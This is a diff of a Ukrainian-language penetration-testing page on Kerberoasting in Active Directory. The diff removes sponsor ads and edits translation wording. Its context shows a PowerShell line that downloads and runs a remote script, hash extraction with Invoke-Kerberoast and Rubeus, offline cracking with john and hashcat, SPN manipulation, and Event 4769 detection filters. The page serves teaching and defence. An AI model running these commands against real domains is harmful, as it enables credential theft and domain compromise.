@@ -1,32 +1,24 @@
 # Kerberoast
 
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Використовуйте [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) для легкого створення та **автоматизації робочих процесів**, підтримуваних **найсучаснішими** інструментами спільноти.\
-Отримайте доступ сьогодні:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
-
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Kerberoast
 
-Kerberoasting зосереджується на отриманні **TGS квитків**, зокрема тих, що стосуються служб, які працюють під **обліковими записами користувачів** в **Active Directory (AD)**, за винятком **облікових записів комп'ютерів**. Шифрування цих квитків використовує ключі, які походять з **паролів користувачів**, що дозволяє можливість **офлайн злому облікових даних**. Використання облікового запису користувача як служби вказується ненульовим значенням властивості **"ServicePrincipalName"**.
+Kerberoasting зосереджується на отриманні **TGS квитків**, зокрема тих, що стосуються сервісів, які працюють під **обліковими записами користувачів** в **Active Directory (AD)**, виключаючи **облікові записи комп'ютерів**. Шифрування цих квитків використовує ключі, що походять від **паролів користувачів**, що дозволяє можливість **офлайн злому облікових даних**. Використання облікового запису користувача як сервісу вказується ненульовим значенням властивості **"ServicePrincipalName"**.
 
 Для виконання **Kerberoasting** необхідний обліковий запис домену, здатний запитувати **TGS квитки**; однак цей процес не вимагає **спеціальних привілеїв**, що робить його доступним для будь-кого з **дійсними доменними обліковими даними**.
 
 ### Ключові моменти:
 
-- **Kerberoasting** націлений на **TGS квитки** для **служб облікових записів користувачів** в **AD**.
+- **Kerberoasting** націлений на **TGS квитки** для **сервісів облікових записів користувачів** в **AD**.
 - Квитки, зашифровані ключами з **паролів користувачів**, можуть бути **зламані офлайн**.
-- Служба визначається ненульовим **ServicePrincipalName**.
+- Сервіс ідентифікується за **ServicePrincipalName**, що не є нульовим.
 - **Спеціальні привілеї** не потрібні, лише **дійсні доменні облікові дані**.
 
 ### **Атака**
 
 > [!WARNING]
-> **Інструменти Kerberoasting** зазвичай запитують **`RC4 шифрування`** під час виконання атаки та ініціювання запитів TGS-REQ. Це пов'язано з тим, що **RC4 є** [**слабшим**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) і легшим для злому офлайн за допомогою таких інструментів, як Hashcat, ніж інші алгоритми шифрування, такі як AES-128 та AES-256.\
+> **Інструменти Kerberoasting** зазвичай запитують **`RC4 шифрування`** під час виконання атаки та ініціювання запитів TGS-REQ. Це пов'язано з тим, що **RC4 є** [**слабшим**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) і легшим для злому офлайн за допомогою інструментів, таких як Hashcat, ніж інші алгоритми шифрування, такі як AES-128 та AES-256.\
 > Хеші RC4 (тип 23) починаються з **`$krb5tgs$23$*`**, тоді як AES-256 (тип 18) починаються з **`$krb5tgs$18$*`**.`
 
 #### **Linux**
@@ -91,17 +83,9 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
 > [!WARNING]
-> Коли запитується TGS, генерується подія Windows `4769 - A Kerberos service ticket was requested`.
+> Коли запитується TGS, генерується подія Windows `4769 - Було запитано квиток служби Kerberos`.
 
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Використовуйте [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) для легкого створення та **автоматизації робочих процесів**, підтримуваних **найсучаснішими** інструментами спільноти.\
-Отримайте доступ сьогодні:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
-
-### Cracking
+### Злом
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
@@ -120,9 +104,9 @@ Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whatever
 - `ntpdate <IP of DC>` - Застаріло з Ubuntu 16.04
 - `rdate -n <IP of DC>`
 
-### Пом'якшення
+### Зменшення ризиків
 
-Kerberoasting може проводитися з високим ступенем прихованості, якщо це експлуатовано. Для виявлення цієї активності слід звернути увагу на **Security Event ID 4769**, який вказує на те, що запит на квиток Kerberos був зроблений. Однак, через високу частоту цієї події, необхідно застосувати специфічні фільтри для ізоляції підозрілої активності:
+Kerberoasting може проводитися з високим ступенем прихованості, якщо це можливо. Для виявлення цієї активності слід звернути увагу на **Security Event ID 4769**, який вказує на те, що запит на квиток Kerberos був зроблений. Однак, через високу частоту цієї події, необхідно застосувати специфічні фільтри для ізоляції підозрілої активності:
 
 - Ім'я служби не повинно бути **krbtgt**, оскільки це нормальний запит.
 - Імена служб, що закінчуються на **$**, слід виключити, щоб уникнути включення облікових записів машин, що використовуються для служб.
@@ -141,7 +125,7 @@ Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{
 
 ## Kerberoast без облікового запису домену
 
-У **вересні 2022 року** новий спосіб експлуатації системи був представлений дослідником на ім'я Чарлі Кларк, поділений через його платформу [exploit.ph](https://exploit.ph/). Цей метод дозволяє отримувати **службові квитки (ST)** через запит **KRB_AS_REQ**, який, що вражає, не вимагає контролю над жодним обліковим записом Active Directory. По суті, якщо принципал налаштований таким чином, що не вимагає попередньої аутентифікації — сценарій, подібний до того, що в кібербезпеці відомий як **атака AS-REP Roasting** — цю характеристику можна використати для маніпуляції процесом запиту. Конкретно, шляхом зміни атрибута **sname** в тілі запиту система обманюється на видачу **ST** замість стандартного зашифрованого квитка на отримання квитків (TGT).
+У **вересні 2022 року** новий спосіб експлуатації системи був представлений дослідником на ім'я Чарлі Кларк, поділений через його платформу [exploit.ph](https://exploit.ph/). Цей метод дозволяє отримувати **службові квитки (ST)** через запит **KRB_AS_REQ**, який, що вражає, не вимагає контролю над жодним обліковим записом Active Directory. По суті, якщо принципал налаштований таким чином, що не вимагає попередньої аутентифікації — сценарій, подібний до того, що в кібербезпеці відомий як **атака AS-REP Roasting** — цю характеристику можна використати для маніпуляції процесом запиту. Конкретно, шляхом зміни атрибута **sname** в тілі запиту система обманюється на видачу **ST** замість стандартного зашифрованого квитка на отримання квитка (TGT).
 
 Техніка повністю пояснена в цій статті: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
@@ -167,11 +151,3 @@ Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"d
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
 
 {{#include ../../banners/hacktricks-training.md}}
-
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Використовуйте [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast), щоб легко створювати та **автоматизувати робочі процеси**, які підтримуються **найсучаснішими** інструментами спільноти.\
-Отримайте доступ сьогодні:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
